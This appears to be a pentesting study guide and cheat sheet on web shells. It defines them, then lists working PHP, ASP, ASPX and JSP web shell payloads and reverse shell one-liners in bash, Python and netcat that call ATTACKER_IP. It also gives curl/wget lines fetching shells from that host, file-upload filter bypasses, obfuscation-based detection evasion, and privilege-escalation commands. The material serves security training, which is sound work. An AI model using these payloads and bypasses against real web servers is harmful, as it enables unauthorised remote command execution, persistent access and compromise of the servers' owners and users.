## 🖥️ What is a Web Shell?

![Image](https://cdn.prod.website-files.com/645a45d56fc4750d4edd96fe/65a8aca63663e691989b7aef_Web-Shells-BLOG.webp)

![Image](https://miro.medium.com/1%2AW5kELyeqLAaUmz0Gfp8KDA.png)

![Image](https://portswigger.net/web-security/file-upload/images/file-upload-vulnerabilities.jpg)

![Image](https://www.mdpi.com/futureinternet/futureinternet-12-00012/article_deploy/html/images/futureinternet-12-00012-g001.png)

### Definition (Important — Keep As It Is)

A **web shell is a browser-based shell session we can use to interact with the underlying operating system of a web server.**

- It allows attackers/pentesters to execute commands remotely.
    
- It is accessed through a **web browser**.
    
- It is usually uploaded as a **file payload** written in the server’s web language.
    

---

## 📦 Real-World Analogy

|Concept|Real World Example|
|---|---|
|Web server|Computer in another building|
|Web shell|Remote control|
|Browser|Remote control interface|
|Upload vulnerability|Open door|

---

## 🎯 Why Web Shells Are Important in Pentesting

Web shells are commonly used because:

- External networks rarely expose SMB, RDP, or SSH publicly.
    
- Web applications are almost always exposed.
    
- Web applications have large attack surfaces.
    

### Common attack vectors:

|Attack Type|Description|
|---|---|
|File Upload Vulnerability|Upload malicious file|
|SQL Injection|Gain access to upload functionality|
|RFI/LFI|Execute remote/local file|
|Command Injection|Execute OS commands|
|Misconfigured FTP|Upload directly to webroot|
|WAR File Upload|Deploy malicious JSP in Tomcat/WebLogic|
|Profile Image Upload|Upload disguised web shell|

---

## ⚙️ How Web Shell Works (Step-by-Step)

![Image](https://www.researchgate.net/publication/356558147/figure/fig1/AS%3A1095476006924291%401638193241728/Webshell-attack-flowchart.jpg)

![Image](https://portswigger.net/web-security/file-upload/images/file-upload-vulnerabilities.jpg)

![Image](https://cdn.prod.website-files.com/681e366f54a6e3ce87159ca4/6877c6d94cd1d4bca7c48143_bind-shell-vs-reverse-shell-01.png)

![Image](https://cdn.prod.website-files.com/5ff66329429d880392f6cba2/6763f7c8f4f5e6425045421b_62335ebfecc98af7c7537c7d_Types%2520of%2520web%2520shells.jpeg)

### Step 1: Find Upload Vulnerability

Example:

- File upload form
    
- Profile picture upload
    
- Document upload
    

### Step 2: Upload Web Shell File

Examples:

```php
<?php system($_GET['cmd']); ?>
```

### Step 3: Access Web Shell via Browser

Example:

```
http://target.com/uploads/shell.php?cmd=whoami
```

### Step 4: Execute Commands

Example:

```
whoami
ls
pwd
id
```

---

## 📁 Common Web Shell File Types

|Language|Extension|Server|
|---|---|---|
|PHP|.php|Apache, Nginx|
|ASP|.asp|IIS|
|ASP.NET|.aspx|IIS|
|JSP|.jsp|Tomcat|
|WAR|.war|Tomcat, WebLogic|
|Python|.py|Flask/Django|

---

## 🧠 What Web Shell Provides

|Capability|Description|
|---|---|
|Remote Code Execution (RCE)|Execute OS commands|
|File access|Read/write files|
|Privilege escalation|Run system commands|
|Persistence|Maintain access|
|Shell upgrade|Get reverse shell|

---

## ⚠️ Limitations of Web Shell

Important — Keep As It Is:

> relying on the web shell alone to interact with the system can be unstable and unreliable because some web applications are configured to delete file uploads after a certain period of time.

### Problems:

|Problem|Explanation|
|---|---|
|Temporary access|Files may be deleted|
|Limited interaction|Not full interactive shell|
|Restricted permissions|Runs as web user|
|Detection risk|Easily logged|

---

## 🔄 Web Shell vs Reverse Shell

|Feature|Web Shell|Reverse Shell|
|---|---|---|
|Access method|Browser|Netcat / Listener|
|Stability|Low|High|
|Interaction|Limited|Full shell|
|Detection|Easier|Harder|
|Upgrade capability|Can upgrade|Already full shell|

---

## 🎯 Example Web Shell Usage

Upload:

```
shell.php
```

Access:

```
http://target.com/uploads/shell.php
```

Execute command:

```
http://target.com/uploads/shell.php?cmd=whoami
```

Output:

```
www-data
```

---

## 🧪 Real Pentesting Scenario

1. Find upload vulnerability
    
2. Upload web shell
    
3. Execute commands
    
4. Upgrade to reverse shell
    
5. Escalate privileges
    
6. Pivot to internal network
    

---

## 🔥 Common Web Shell Tools

|Tool|Description|
|---|---|
|php-reverse-shell|PHP reverse shell|
|PentestMonkey shell|Popular PHP shell|
|Weevely|Stealth PHP shell|
|China Chopper|Advanced web shell|
|ASPX shell|Windows IIS shell|

---

## 📍 Common Webroot Locations

|Server|Location|
|---|---|
|Apache|/var/www/html|
|Nginx|/usr/share/nginx/html|
|IIS|C:\inetpub\wwwroot|
|Tomcat|/opt/tomcat/webapps|

---

## 🧠 Key Points to Remember (Exam Important)

✔ Web shell = browser-based shell  
✔ Requires upload vulnerability  
✔ Used for remote command execution  
✔ Usually written in PHP, JSP, ASPX  
✔ Often upgraded to reverse shell  
✔ Runs as web server user (www-data, apache, nginx)

---

## 🔥 Typical Attack Flow

```
Find Upload Vulnerability
        ↓
Upload Web Shell
        ↓
Access via Browser
        ↓
Execute Commands
        ↓
Upgrade to Reverse Shell
        ↓
Privilege Escalation
```

---
# 🌐 Web Shell Cheat Sheet (Pentesting)

---

# 📁 Web Shell Basics

|Item|Description|Example|
|---|---|---|
|Web Shell|Browser-based shell to execute OS commands|shell.php|
|Purpose|Remote Command Execution (RCE)|whoami|
|Access Method|Web browser|[http://target/shell.php](http://target/shell.php)|
|Runs As|Web server user|www-data, apache|
|Upgrade Path|Reverse shell|nc, bash|

---

# 📄 Basic Web Shell Payloads

## PHP Web Shell

|Type|Payload|
|---|---|
|Command execution|`php <?php system($_GET['cmd']); ?>`|
|Interactive shell|`php <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>`|
|Simple exec|`php <?php echo shell_exec($_GET['cmd']); ?>`|

Access:

```
http://target/shell.php?cmd=whoami
```

---

## ASP Web Shell

|Payload|Code|
|---|---|
|Command shell|`asp <% eval request("cmd") %>`|

Access:

```
http://target/shell.asp?cmd=whoami
```

---

## ASPX Web Shell

|Payload|Code|
|---|---|
|Command execution|`aspx <%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request.QueryString["cmd"]).StandardOutput.ReadToEnd()); %>`|

---

## JSP Web Shell

|Payload|Code|
|---|---|
|Command execution|`jsp <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`|

Access:

```
http://target/shell.jsp?cmd=whoami
```

---

# 🧪 Reverse Shell via Web Shell

## Linux Reverse Shell

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

Listener:

```bash
nc -lvnp 4444
```

---

## PHP Reverse Shell

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

---

# 📤 File Upload Bypass Techniques

|Technique|Example|
|---|---|
|Double extension|shell.php.jpg|
|Case bypass|shell.PHP|
|Null byte|shell.php%00.jpg|
|Alternate extension|shell.phtml|
|MIME bypass|Change Content-Type|
|Magic bytes bypass|Add image header|

---

# 📂 Common Upload Locations

|Server|Location|
|---|---|
|Apache|/var/www/html/uploads|
|Nginx|/usr/share/nginx/html|
|IIS|C:\inetpub\wwwroot|
|Tomcat|/opt/tomcat/webapps|

---

# 🔎 Finding Uploaded Web Shell

```bash
find / -name "*.php" 2>/dev/null
```

```bash
ls /var/www/html
```

---

# ⚡ Upgrade Web Shell → Reverse Shell

## Method 1: Bash

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

## Method 2: Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## Method 3: Netcat

```bash
nc ATTACKER_IP 4444 -e /bin/bash
```

---

# 🧰 Spawn Interactive TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Fix terminal:

```bash
export TERM=xterm
```

```bash
stty rows 40 columns 100
```

---

# 🔍 Identify Web Server User

```bash
whoami
```

Common outputs:

|User|Meaning|
|---|---|
|www-data|Apache|
|apache|Apache|
|nginx|Nginx|
|tomcat|Tomcat|
|iis apppool|IIS|

---

# 📡 Transfer Better Shell

## Using wget

```bash
wget http://ATTACKER_IP/shell.php
```

## Using curl

```bash
curl http://ATTACKER_IP/shell.php -o shell.php
```

---

# 🧠 Web Shell → Privilege Escalation Checks

```bash
sudo -l
```

```bash
id
```

```bash
uname -a
```

```bash
cat /etc/passwd
```

---

# 🎯 Common Pentest Workflow

|Step|Action|
|---|---|
|1|Find upload vulnerability|
|2|Upload web shell|
|3|Execute commands|
|4|Get reverse shell|
|5|Spawn TTY shell|
|6|Privilege escalation|
|7|Persistence|

---

# 🔥 Quick One-Liner Web Shell (Exam Favorite)

PHP:

```php
<?php system($_GET['cmd']); ?>
```

Access:

```
http://target/shell.php?cmd=id
```

---

# 🧠 Detection Evasion Tips

|Method|Example|
|---|---|
|Rename file|image.php|
|Hide in images|shell.php.jpg|
|Encode payload|base64|
|Obfuscate code|eval(base64_decode())|

---

# 🏆 Most Important Commands (Memorize)

```bash
nc -lvnp 4444
```

```bash
bash -i >& /dev/tcp/IP/4444 0>&1
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
whoami
```

```bash
sudo -l
```

---
